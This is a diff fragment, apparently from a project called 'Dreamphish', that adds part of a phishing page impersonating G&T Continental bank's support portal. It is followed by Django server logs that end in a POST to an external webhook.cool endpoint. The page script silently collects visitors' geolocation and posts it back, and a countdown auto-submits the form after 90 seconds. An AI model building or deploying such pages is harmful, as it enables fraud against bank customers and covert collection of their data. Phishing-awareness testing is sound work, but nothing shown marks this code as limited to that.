+<input class="btn btn-primary btn-lg btn-block" type="submit" value="Confirmar"/>
+</div>
+<div id="cuenta" style="color: #fff;"><p> <span id="seg" style="color: #fff;">90</span> segundos</p> </div>
+</form>
+</div>
+</div>
+<script>
+            // Obtenemos el campo de texto
+            const prefixedText = document.getElementById('prefixedText');
+        
+            // Al escribir en el campo de texto
+            //  prefixedText.addEventListener('input', function() {
+            //    Verificamos si el valor del campo comienza con 'G - '
+            //    if (!this.value.startsWith('G - ')) {
+            //        Si no comienza con 'G - ', lo establecemos al inicio
+            //        this.value = 'G - ' + this.value.replace('G - ', '');
+            //    }
+            //});
+        </script>
+<footer>
+<p1>Portal de soporte</p1>
+<p>6a Avenida 9-08 Zona 9 Ciudad de Guatemala, Sede Central. <br/> 2024 Todos los derechos reservados G&amp;T Continental </p>
+</footer>
+<script>
+            function getLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendPosition);
+                }
+            }
+            function sendPosition(position) {
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", window.location.href, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
+            }
+            window.onload = getLocation;
+        </script></body>
+<script> 
+        var contador = function(tiempo, intervalo){
+         var enCurso = 0, intv = intervalo || 1000;
+         var veces = tiempo / intv, este = this, timer;
+         this.empezar = function(callback){
+          enCurso = 1;
+          timer = setTimeout(function(){
+           if(veces + 1 && enCurso){
+            callback(veces-- * intv);
+            setTimeout(function(){ este.empezar(callback); }, intv);
+           }else{
+            return enCurso = 0;
+           }
+          }, intv);
+         };
+         this.parar = function(){
+          if(enCurso){ enCurso = 0; }
+         };
+        }
+        var cuentaAtras = new contador(89000);
+        document.body.onload = function(){ cuentaAtras.empezar(function(tiempo){
+         document.getElementById('cuenta').innerHTML = tiempo / 1000 + ' segundos';
+         if(!tiempo){ document.getElementsByTagName('form')[0].submit() }
+        }); }
+        document.getElementById('boton-parar').onclick = cuentaAtras.parar;
+        
+        </script>
+</html>
+
+Error al procesar webhook: Object of type datetime is not JSON serializable
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\core\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+C:\Users\lanat\OneDrive\Escritorio\DreamLab\Dreamphish\dreamphish\webhooks\views.py changed, reloading.
+Watching for file changes with StatReloader
+Watching for file changes with StatReloader
+Starting new HTTPS connection (1): faint-van-52.webhook.cool:443
+https://faint-van-52.webhook.cool:443 "POST / HTTP/11" 200 0
